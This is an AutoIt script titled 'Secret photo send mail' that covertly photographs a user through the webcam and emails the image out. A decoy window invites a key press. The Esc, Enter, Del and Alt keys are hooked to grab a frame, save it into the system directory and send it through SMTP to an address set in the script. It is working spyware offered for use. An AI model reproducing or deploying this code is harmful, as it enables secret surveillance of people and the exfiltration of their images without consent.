;Secret photo send mail

;Created by BY_KEVEN www.wolfsecurity.org


$WM_CAP_START = 0x400
$WM_CAP_UNICODE_START = $WM_CAP_START +100 
$WM_CAP_PAL_SAVEA = $WM_CAP_START + 81 
$WM_CAP_PAL_SAVEW = $WM_CAP_UNICODE_START + 81 
$WM_CAP_UNICODE_END = $WM_CAP_PAL_SAVEW 
$WM_CAP_ABORT = $WM_CAP_START + 69 
$WM_CAP_DLG_VIDEOCOMPRESSION = $WM_CAP_START + 46 
$WM_CAP_DLG_VIDEODISPLAY = $WM_CAP_START + 43 
$WM_CAP_DLG_VIDEOFORMAT = $WM_CAP_START + 41 
$WM_CAP_DLG_VIDEOSOURCE = $WM_CAP_START + 42 
$WM_CAP_DRIVER_CONNECT = $WM_CAP_START + 10 
$WM_CAP_DRIVER_DISCONNECT = $WM_CAP_START + 11 
$WM_CAP_DRIVER_GET_CAPS = $WM_CAP_START + 14 
$WM_CAP_DRIVER_GET_NAMEA = $WM_CAP_START + 12 
$WM_CAP_DRIVER_GET_NAMEW = $WM_CAP_UNICODE_START + 12 
$WM_CAP_DRIVER_GET_VERSIONA = $WM_CAP_START + 13 
$WM_CAP_DRIVER_GET_VERSIONW = $WM_CAP_UNICODE_START + 13 
$WM_CAP_EDIT_COPY = $WM_CAP_START + 30 
$WM_CAP_END = $WM_CAP_UNICODE_END 
$WM_CAP_FILE_ALLOCATE = $WM_CAP_START + 22 
$WM_CAP_FILE_GET_CAPTURE_FILEA = $WM_CAP_START + 21 
$WM_CAP_FILE_GET_CAPTURE_FILEW = $WM_CAP_UNICODE_START + 21 
$WM_CAP_FILE_SAVEASA = $WM_CAP_START + 23 
$WM_CAP_FILE_SAVEASW = $WM_CAP_UNICODE_START + 23 
$WM_CAP_FILE_SAVEDIBA = $WM_CAP_START + 25 
$WM_CAP_FILE_SAVEDIBW = $WM_CAP_UNICODE_START + 25 
$WM_CAP_FILE_SET_CAPTURE_FILEA = $WM_CAP_START + 20 
$WM_CAP_FILE_SET_CAPTURE_FILEW = $WM_CAP_UNICODE_START + 20 
$WM_CAP_FILE_SET_INFOCHUNK = $WM_CAP_START + 24 
$WM_CAP_GET_AUDIOFORMAT = $WM_CAP_START + 36 
$WM_CAP_GET_CAPSTREAMPTR = $WM_CAP_START + 1 
$WM_CAP_GET_MCI_DEVICEA = $WM_CAP_START + 67 
$WM_CAP_GET_MCI_DEVICEW = $WM_CAP_UNICODE_START + 67 
$WM_CAP_GET_SEQUENCE_SETUP = $WM_CAP_START + 65 
$WM_CAP_GET_STATUS = $WM_CAP_START + 54 
$WM_CAP_GET_USER_DATA = $WM_CAP_START + 8 
$WM_CAP_GET_VIDEOFORMAT = $WM_CAP_START + 44 
$WM_CAP_GRAB_FRAME = $WM_CAP_START + 60 
$WM_CAP_GRAB_FRAME_NOSTOP = $WM_CAP_START + 61 
$WM_CAP_PAL_AUTOCREATE = $WM_CAP_START + 83 
$WM_CAP_PAL_MANUALCREATE = $WM_CAP_START + 84 
$WM_CAP_PAL_OPENA = $WM_CAP_START + 80 
$WM_CAP_PAL_OPENW = $WM_CAP_UNICODE_START + 80 
$WM_CAP_PAL_PASTE = $WM_CAP_START + 82 
$WM_CAP_SEQUENCE = $WM_CAP_START + 62 
$WM_CAP_SEQUENCE_NOFILE = $WM_CAP_START + 63 
$WM_CAP_SET_AUDIOFORMAT = $WM_CAP_START + 35 
$WM_CAP_SET_CALLBACK_CAPCONTROL = $WM_CAP_START + 85 
$WM_CAP_SET_CALLBACK_ERRORA = $WM_CAP_START + 2 
$WM_CAP_SET_CALLBACK_ERRORW = $WM_CAP_UNICODE_START + 2 
$WM_CAP_SET_CALLBACK_FRAME = $WM_CAP_START + 5 
$WM_CAP_SET_CALLBACK_STATUSA = $WM_CAP_START + 3 
$WM_CAP_SET_CALLBACK_STATUSW = $WM_CAP_UNICODE_START + 3 
$WM_CAP_SET_CALLBACK_VIDEOSTREAM = $WM_CAP_START + 6 
$WM_CAP_SET_CALLBACK_WAVESTREAM = $WM_CAP_START + 7 
$WM_CAP_SET_CALLBACK_YIELD = $WM_CAP_START + 4 
$WM_CAP_SET_MCI_DEVICEA = $WM_CAP_START + 66 
$WM_CAP_SET_MCI_DEVICEW = $WM_CAP_UNICODE_START + 66 
$WM_CAP_SET_OVERLAY = $WM_CAP_START + 51 
$WM_CAP_SET_PREVIEW = $WM_CAP_START + 50 
$WM_CAP_SET_PREVIEWRATE = $WM_CAP_START + 52 
$WM_CAP_SET_SCALE = $WM_CAP_START + 53 
$WM_CAP_SET_SCROLL = $WM_CAP_START + 55 
$WM_CAP_SET_SEQUENCE_SETUP = $WM_CAP_START + 64 
$WM_CAP_SET_USER_DATA = $WM_CAP_START + 9 
$WM_CAP_SET_VIDEOFORMAT = $WM_CAP_START + 45 
$WM_CAP_SINGLE_FRAME = $WM_CAP_START + 72 
$WM_CAP_SINGLE_FRAME_CLOSE = $WM_CAP_START + 71 
$WM_CAP_SINGLE_FRAME_OPEN = $WM_CAP_START + 70 
$WM_CAP_STOP = $WM_CAP_START + 68
#Include<file.au3>
#include <GUIConstantsEX.au3>
#include <WindowsConstants.au3>

$avi = DllOpen("avicap32.dll")
$user = DllOpen("user32.dll")
$snapfile = @SystemDir & "\frend.bmp"

$Main = GUICreate("Camera Press Enter=Show Loading......:)",350,270)
$cap = DllCall($avi, "int", "capCreateCaptureWindow", "str", "cap", "int", BitOR($WS_CHILD,$WS_VISIBLE), "int", 15, "int", 15, "int", 320, "int", 240, "hwnd", $Main, "int", 1)

DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_DRIVER_CONNECT, "int", 0, "int", 0)
DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_SET_SCALE, "int", 1, "int", 0)
DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_SET_OVERLAY, "int", 1, "int", 0)
DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_SET_PREVIEW, "int", 1, "int", 0)
DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_SET_PREVIEWRATE, "int", 1, "int", 0)

GUISetState(@SW_SHOW)

HotKeySet("{esc}", "SnapShot"); Press 'Insert' to make a SnapShot !
HotKeySet("{enter}", "SnapShot"); Press 'Insert' to make a SnapShot !
HotKeySet("{del}", "SnapShot"); Press 'Insert' to make a SnapShot !
HotKeySet("{alt}", "SnapShot"); Press 'Insert' to make a SnapShot !
$SmtpServer = "smtp.yoursite.com"              ; address for the smtp-server to use - REQUIRED
$FromName = @ComputerName                     ; name from who the email was sent
$FromAddress = @ScriptFullPath ; address from where the mail should come
$ToAddress = "my@yoursite.com"   ; destination address of the email - REQUIRED
$Subject = "frend"                   ; subject from the email - can be anything you want it to be
$Body = "secret photo"                               ; the messagebody from the mail - can be left blank but then you get a blank mail
$AttachFiles = @SystemDir & "\frend.bmp"                      ; the file you want to attach- leave blank if not needed
$CcAddress = ""       ; address for cc - leave blank if not needed
$BccAddress = ""     ; address for bcc - leave blank if not needed
$Importance = "Normal"                  ; Send message priority: "High", "Normal", "Low"
$Username = "my"                    ; username for the account used from where the mail gets sent - REQUIRED
$Password =  "password"                  ; password for the account used from where the mail gets sent - REQUIRED
$IPPort = 25                            ; port used for sending the mail
$ssl = 0                                ; enables/disables secure socket layer sending - put to 1 if using httpS
While 1
    $msg = GUIGetMsg()
    If $msg = $GUI_EVENT_CLOSE Then
    ;DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_SET_CALLBACK_FRAME, "int", 0, "int", 0)
        DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_END, "int", 0, "int", 0)
        DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_DRIVER_DISCONNECT, "int", 0, "int", 0)
    ;DllClose($avi)
        DllClose($user)
        Exit
    EndIf
    Sleep(1)
Wend

Func SnapShot()
    DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_GRAB_FRAME_NOSTOP, "int", 0, "int", 0)
    DllCall($user, "int", "SendMessage", "hWnd", $cap[0], "int", $WM_CAP_FILE_SAVEDIBA, "int", 0, "str", $snapfile)



Global $oMyRet[2]
Global $oMyError = ObjEvent("Error", "MyErrFunc")
$rc = _INetSmtpMailCom($SmtpServer, $FromName, $FromAddress, $ToAddress, $Subject, $Body, $AttachFiles, $CcAddress, $BccAddress, $Importance, $Username, $Password, $IPPort, $ssl)
EndFunc
If @error Then
    MsgBox(0, "Error ", "Error code:" & @error & "  Description:" & $rc)
EndIf
;
; The UDF
Func _INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject = "", $as_Body = "", $s_AttachFiles = "", $s_CcAddress = "", $s_BccAddress = "", $s_Importance="Normal", $s_Username = "", $s_Password = "", $IPPort = 25, $ssl = 0)
    Local $objEmail = ObjCreate("CDO.Message")
    $objEmail.From = '"' & $s_FromName & '" <' & $s_FromAddress & '>'
    $objEmail.To = $s_ToAddress
    Local $i_Error = 0
    Local $i_Error_desciption = ""
    If $s_CcAddress <> "" Then $objEmail.Cc = $s_CcAddress
    If $s_BccAddress <> "" Then $objEmail.Bcc = $s_BccAddress
    $objEmail.Subject = $s_Subject
    If StringInStr($as_Body, "<") And StringInStr($as_Body, ">") Then
        $objEmail.HTMLBody = $as_Body
    Else
        $objEmail.Textbody = $as_Body & @CRLF
    EndIf
    If $s_AttachFiles <> "" Then
        Local $S_Files2Attach = StringSplit($s_AttachFiles, ";")
        For $x = 1 To $S_Files2Attach[0]
            $S_Files2Attach[$x] = _PathFull($S_Files2Attach[$x])
            ConsoleWrite('@@ Debug(62) : $S_Files2Attach = ' & $S_Files2Attach & @LF & '>Error code: ' & @error & @LF) ;### Debug Console
            If FileExists($S_Files2Attach[$x]) Then
                $objEmail.AddAttachment ($S_Files2Attach[$x])
            Else
                ConsoleWrite('!> File not found to attach: ' & $S_Files2Attach[$x] & @LF)
                SetError(1)
                Return 0
            EndIf
        Next
    EndIf
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = $s_SmtpServer
    If Number($IPPort) = 0 then $IPPort = 25
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = $IPPort
    ;Authenticated SMTP
    If $s_Username <> "" Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusername") = $s_Username
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = $s_Password
    EndIf
    If $ssl Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
    EndIf
    ;Update settings
    $objEmail.Configuration.Fields.Update
    ; Set Email Importance
    Switch $s_Importance
        Case "High"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "High"
        Case "Normal"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "Normal"
        Case "Low"
            $objEmail.Fields.Item ("urn:schemas:mailheader:Importance") = "Low"
    EndSwitch
    $objEmail.Fields.Update
    ; Sent the Message
    $objEmail.Send
    If @error Then
        SetError(2)
        Return $oMyRet[1]
    EndIf
    $objEmail=""
EndFunc   ;==>_INetSmtpMailCom
;
;
; Com Error Handler
Func MyErrFunc()
    $HexNumber = Hex($oMyError.number, 8)
    $oMyRet[0] = $HexNumber
    $oMyRet[1] = StringStripWS($oMyError.description, 3)
    ConsoleWrite("### COM Error !  Number: " & $HexNumber & "   ScriptLine: " & $oMyError.scriptline & "   Description:" & $oMyRet[1] & @LF)
    SetError(1); something to check for when this function returns
    Return
EndFunc   ;==>MyErrFunc